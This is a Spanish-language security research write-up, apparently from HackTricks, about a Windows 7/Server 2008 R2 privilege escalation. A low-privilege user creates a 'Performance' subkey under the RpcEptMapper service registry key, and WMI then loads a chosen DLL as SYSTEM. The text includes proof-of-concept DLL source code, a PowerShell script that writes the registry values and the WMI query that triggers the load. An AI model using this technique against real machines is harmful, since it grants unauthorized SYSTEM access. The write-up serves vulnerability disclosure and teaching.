Según la salida del script, el usuario actual tiene algunos permisos de escritura en dos claves del registro:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

Vamos a verificar manualmente los permisos del servicio `RpcEptMapper` utilizando la GUI de `regedit`. Una cosa que me gusta mucho de la ventana de _Configuración avanzada de seguridad_ es la pestaña de _Permisos efectivos_. Puedes elegir cualquier nombre de usuario o grupo y ver inmediatamente los permisos efectivos que se otorgan a este principal sin necesidad de inspeccionar todos los ACE por separado. La siguiente captura de pantalla muestra el resultado para la cuenta de bajo privilegio `lab-user`.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

La mayoría de los permisos son estándar (por ejemplo: `Query Value`), pero uno en particular destaca: `Create Subkey`. El nombre genérico correspondiente a este permiso es `AppendData/AddSubdirectory`, que es exactamente lo que informó el script:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
¿Qué significa exactamente? Significa que no podemos simplemente modificar el valor `ImagePath`, por ejemplo. Para hacerlo, necesitaríamos el permiso `WriteData/AddFile`. En su lugar, solo podemos crear una nueva subclave.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

¿Significa esto que fue realmente un falso positivo? Seguramente no. ¡Que comience la diversión!

## RTFM <a href="#rtfm" id="rtfm"></a>

En este punto, sabemos que podemos crear subclaves arbitrarias en `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`, pero no podemos modificar subclaves y valores existentes. Estas subclaves ya existentes son `Parameters` y `Security`, que son bastante comunes para los servicios de Windows.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

Por lo tanto, la primera pregunta que vino a mi mente fue: _¿hay alguna otra subclave predefinida - como `Parameters` y `Security` - que podríamos aprovechar para modificar efectivamente la configuración del servicio y alterar su comportamiento de alguna manera?_

Para responder a esta pregunta, mi plan inicial fue enumerar todas las claves existentes e intentar identificar un patrón. La idea era ver qué subclaves son _significativas_ para la configuración de un servicio. Empecé a pensar en cómo podría implementarlo en PowerShell y luego ordenar el resultado. Sin embargo, antes de hacerlo, me pregunté si esta estructura de registro ya estaba documentada. Entonces, busqué en Google algo como `windows service configuration registry site:microsoft.com` y aquí está el primer [resultado](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) que salió.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

¡Parece prometedor, verdad? A primera vista, la documentación no parecía exhaustiva y completa. Considerando el título, esperaba ver algún tipo de estructura de árbol detallando todas las subclaves y valores que definen la configuración de un servicio, pero claramente no estaba allí.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

Aun así, eché un vistazo rápido a cada párrafo. Y rápidamente encontré las palabras clave "_**Performance**_" y "_**DLL**_". Bajo el subtítulo "**Perfomance**", podemos leer lo siguiente:

> **Performance**: _Una clave que especifica información para el monitoreo opcional de rendimiento. Los valores bajo esta clave especifican **el nombre de la DLL de rendimiento del controlador** y **los nombres de ciertas funciones exportadas en esa DLL**. Puede agregar entradas de valor a esta subclave usando entradas AddReg en el archivo INF del controlador._

Según este breve párrafo, uno teóricamente puede registrar una DLL en un servicio de controlador para monitorear su rendimiento gracias a la subclave `Performance`. **¡OK, esto es realmente interesante!** Esta clave no existe por defecto para el servicio `RpcEptMapper`, por lo que parece que es _exactamente_ lo que necesitamos. Hay un pequeño problema, sin embargo, este servicio definitivamente no es un servicio de controlador. De todos modos, todavía vale la pena intentarlo, pero necesitamos más información sobre esta función de "Monitoreo de rendimiento" primero.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **Nota:** en Windows, cada servicio tiene un `Tipo` dado. Un tipo de servicio puede ser uno de los siguientes valores: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` o `SERVICE_INTERACTIVE_PROCESS (256)`.

Después de buscar en Google, encontré este recurso en la documentación: [Creación de la clave de rendimiento de la aplicación](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key).

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08_performance-subkey-documentation.png)

En primer lugar, hay una estructura de árbol agradable que enumera todas las claves y valores que debemos crear. Luego, la descripción da la siguiente información clave:

* El valor `Library` puede contener **un nombre de DLL o una ruta completa a una DLL**.
* Los valores `Open`, `Collect` y `Close` le permiten especificar **los nombres de las funciones** que deben ser exportadas por la DLL.
* El tipo de datos de estos valores es `REG_SZ` (o incluso `REG_EXPAND_SZ` para el valor `Library`).

Si sigue los enlaces que se incluyen en este recurso, incluso encontrará el prototipo de estas funciones junto con algunos ejemplos de código: [Implementación de OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata).
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
¡Creo que ya es suficiente con la teoría, es hora de empezar a escribir código!

## Escribiendo una prueba de concepto <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

Gracias a todos los fragmentos de información que pude recopilar a lo largo de la documentación, escribir una DLL simple de prueba de concepto debería ser bastante sencillo. Pero aún así, ¡necesitamos un plan!

Cuando necesito explotar algún tipo de vulnerabilidad de secuestro de DLL, suelo empezar con una función de ayuda de registro simple y personalizada. El propósito de esta función es escribir información clave en un archivo cada vez que se invoca. Por lo general, registro el PID del proceso actual y del proceso padre, el nombre del usuario que ejecuta el proceso y la línea de comandos correspondiente. También registro el nombre de la función que desencadenó este evento de registro. De esta manera, sé qué parte del código se ejecutó.

En mis otros artículos, siempre omití la parte de desarrollo porque asumí que era más o menos obvia. Pero también quiero que mis publicaciones en el blog sean amigables para principiantes, así que hay una contradicción. Remediare esta situación aquí detallando el proceso. Entonces, iniciemos Visual Studio y creemos un nuevo proyecto de "Aplicación de consola C++". Tenga en cuenta que podría haber creado un proyecto de "Biblioteca de vínculo dinámico (DLL)", pero en realidad encuentro más fácil empezar con una aplicación de consola.

Aquí está el código inicial generado por Visual Studio:
```c
#include <iostream>

int main()
{
    std::cout << "Hello World!\n";
}
```
Por supuesto, eso no es lo que queremos. Queremos crear una DLL, no un EXE, por lo que tenemos que reemplazar la función `main` con `DllMain`. Puede encontrar un código esqueleto para esta función en la documentación: [Inicializar una DLL](https://docs.microsoft.com/es-es/cpp/build/run-time-library-behavior#initialize-a-dll).
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        Log(L"DllMain"); // See log helper function below
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
En paralelo, también necesitamos cambiar la configuración del proyecto para especificar que el archivo compilado de salida debe ser un DLL en lugar de un EXE. Para hacerlo, puedes abrir las propiedades del proyecto y, en la sección "**General**", seleccionar "**Biblioteca dinámica (.dll)**" como el "**Tipo de configuración**". Justo debajo de la barra de título, también puedes seleccionar "**Todas las configuraciones**" y "**Todas las plataformas**" para que esta configuración se aplique globalmente.

A continuación, agrego mi función de ayuda de registro personalizada.
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
    LPWSTR pwszBuffer, pwszCommandLine;
    WCHAR wszUsername[UNLEN + 1] = { 0 };
    SYSTEMTIME st = { 0 };
    HANDLE hToolhelpSnapshot;
    PROCESSENTRY32 stProcessEntry = { 0 };
    DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
    BOOL bResult = FALSE;

    // Get the command line of the current process
    pwszCommandLine = GetCommandLine();

    // Get the name of the process owner
    GetUserName(wszUsername, &dwPcbBuffer);

    // Get the PID of the current process
    dwProcessId = GetCurrentProcessId();

    // Get the PID of the parent process
    hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
        do {
            if (stProcessEntry.th32ProcessID == dwProcessId) {
                dwParentProcessId = stProcessEntry.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
    }
    CloseHandle(hToolhelpSnapshot);

    // Get the current date and time
    GetLocalTime(&st);

    // Prepare the output string and log the result
    dwBufSize = 4096 * sizeof(WCHAR);
    pwszBuffer = (LPWSTR)malloc(dwBufSize);
    if (pwszBuffer)
    {
        StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
            st.wHour,
            st.wMinute,
            st.wSecond,
            dwProcessId,
            dwParentProcessId,
            wszUsername,
            pwszCommandLine,
            pwszCallingFrom
        );

        LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

        free(pwszBuffer);
    }
}
```
Entonces, podemos poblar la DLL con las tres funciones que vimos en la documentación. La documentación también indica que deberían devolver `ERROR_SUCCESS` si tienen éxito.
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
    Log(L"OpenPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
    Log(L"CollectPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
    Log(L"ClosePerfData");
    return ERROR_SUCCESS;
}
```
Bien, ahora el proyecto está correctamente configurado, `DllMain` está implementado, tenemos una función auxiliar de registro y las tres funciones requeridas. Sin embargo, falta una última cosa. Si compilamos este código, `OpenPerfData`, `CollectPerfData` y `ClosePerfData` solo estarán disponibles como funciones internas, por lo que necesitamos **exportarlas**. Esto se puede lograr de varias maneras. Por ejemplo, podríamos crear un archivo [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) y luego configurar el proyecto adecuadamente. Sin embargo, prefiero usar la palabra clave `__declspec(dllexport)` ([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)), especialmente para un proyecto pequeño como este. De esta manera, solo tenemos que declarar las tres funciones al principio del código fuente.
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
Si desea ver el código completo, lo he subido [aquí](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12).

Finalmente, podemos seleccionar _**Release/x64**_ y "_**Build the solution**_". Esto producirá nuestro archivo DLL: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## Probando el PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

Antes de continuar, siempre me aseguro de que mi carga útil funcione correctamente probándola por separado. El poco tiempo invertido aquí puede ahorrar mucho tiempo después al evitar que se adentre en un callejón sin salida durante una fase hipotética de depuración. Para hacerlo, simplemente podemos usar `rundll32.exe` y pasar el nombre del DLL y el nombre de una función exportada como parámetros.
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
¡Genial! El archivo de registro fue creado y, si lo abrimos, podemos ver dos entradas. La primera se escribió cuando la DLL fue cargada por `rundll32.exe`. La segunda se escribió cuando se llamó a `OpenPerfData`. ¡Se ve bien! 😊
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
Bien, ahora podemos centrarnos en la vulnerabilidad real y comenzar creando la clave y los valores de registro necesarios. Podemos hacer esto manualmente usando `reg.exe` / `regedit.exe` o programáticamente con un script. Dado que ya pasé por los pasos manuales durante mi investigación inicial, mostraré una forma más limpia de hacer lo mismo con un script de PowerShell. Además, crear claves y valores de registro en PowerShell es tan fácil como llamar a `New-Item` y `New-ItemProperty`, ¿verdad? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`Se denegó el acceso al registro solicitado`... Hmmm, ok... Parece que no será tan fácil después de todo. ![:stuck\_out\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

Realmente no investigué este problema, pero supongo que cuando llamamos a `New-Item`, `powershell.exe` intenta abrir la clave de registro principal con algunos indicadores que corresponden a permisos que no tenemos.

De todos modos, si los cmdlets integrados no hacen el trabajo, siempre podemos bajar un nivel e invocar las funciones de DotNet directamente. De hecho, las claves de registro también se pueden crear con el siguiente código en PowerShell.
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
¡Aquí vamos! Al final, he creado el siguiente script para crear la clave y valores apropiados, esperar por alguna entrada del usuario y finalmente terminar limpiando todo.
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
El último paso ahora es **¿cómo engañamos al servicio RPC Endpoint Mapper para que cargue nuestra DLL de rendimiento?** Desafortunadamente, no he registrado todas las diferentes cosas que intenté. Hubiera sido realmente interesante en el contexto de esta publicación de blog resaltar lo tediosa y consumidora de tiempo que puede ser la investigación a veces. De todos modos, una cosa que encontré en el camino es que se pueden consultar _Contadores de rendimiento_ utilizando WMI (_Windows Management Instrumentation_), lo cual no es demasiado sorprendente después de todo. Más información aquí: [_Tipos de contadores de rendimiento de WMI_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Los tipos de contador aparecen como el calificador CounterType para propiedades en_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _clases, y como el calificador CookingType para propiedades en_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _clases._

Entonces, primero enumeré las clases de WMI que están relacionadas con _Datos de rendimiento_ en PowerShell usando el siguiente comando.
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
¡Y vi que mi archivo de registro se creó casi de inmediato! Aquí está el contenido del archivo.
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
Esperaba obtener una ejecución de código arbitrario como `NETWORK SERVICE` en el contexto del servicio `RpcEptMapper` como máximo, pero parece que obtuve un resultado mucho mejor de lo esperado. De hecho, obtuve una ejecución de código arbitrario en el contexto del servicio `WMI` en sí, que se ejecuta como `LOCAL SYSTEM`. ¡Qué increíble es eso! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **Nota:** si hubiera obtenido una ejecución de código arbitrario como `NETWORK SERVICE`, habría estado a solo un token de la cuenta `LOCAL SYSTEM` gracias al truco que James Forshaw demostró hace unos meses en esta publicación de blog: [Compartiendo una sesión de inicio de sesión un poco demasiado](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

También intenté obtener cada clase WMI por separado y observé el mismo resultado exacto.
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## Conclusión <a href="#conclusion" id="conclusion"></a>

No sé cómo esta vulnerabilidad ha pasado desapercibida durante tanto tiempo. Una explicación es que otras herramientas probablemente buscaban acceso completo de escritura en el registro, mientras que `AppendData/AddSubdirectory` era suficiente en este caso. En cuanto a la "configuración incorrecta" en sí, supondría que la clave del registro se estableció de esta manera para un propósito específico, aunque no puedo pensar en un escenario concreto en el que los usuarios tengan algún tipo de permiso para modificar la configuración de un servicio.

Decidí escribir sobre esta vulnerabilidad públicamente por dos razones. La primera es que la hice pública, sin darme cuenta inicialmente, el día que actualicé mi script PrivescCheck con la función `GetModfiableRegistryPath`, que fue hace varios meses. La segunda es que el impacto es bajo. Requiere acceso local y solo afecta a versiones antiguas de Windows que ya no tienen soporte (a menos que haya comprado el Soporte Extendido...). En este punto, si todavía está utilizando Windows 7 / Server 2008 R2 sin aislar adecuadamente estas máquinas en la red primero, entonces evitar que un atacante obtenga privilegios de SYSTEM probablemente sea lo menos de sus preocupaciones.

Aparte del lado anecdótico de esta vulnerabilidad de escalada de privilegios, creo que esta configuración de registro de "Rendimiento" abre oportunidades realmente interesantes para la post-explotación, el movimiento lateral y la evasión de AV/EDR. Ya tengo algunos escenarios particulares en mente, pero aún no los he probado. ¿Continuará?...

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
